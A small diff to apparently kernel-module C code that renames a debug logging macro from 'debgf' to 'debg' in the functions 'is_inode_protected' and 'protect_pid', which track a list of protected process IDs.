@@ -122,7 +122,7 @@ bool is_inode_protected(uint64_t inode) {
 
   for (; i < pst.count; i++) {
     if ((tp = __cmd_protect_find(pst.list[i])) == NULL) {
-      debgf("task struct not found for pid: %d", pst.list[i]);
+      debg("task struct not found for pid: %d", pst.list[i]);
       continue;
     }
 
@@ -140,7 +140,7 @@ bool protect_pid(pid_t pid) {
     pst.list = (void *)krealloc(pst.list, ++pst.count * sizeof(pid_t), GFP_KERNEL);
 
   pst.list[pst.count - 1] = pid;
-  debgf("protecting PID: %d", pst.list[pst.count - 1]);
+  debg("protecting PID: %d", pst.list[pst.count - 1]);
 
   return true;
 }
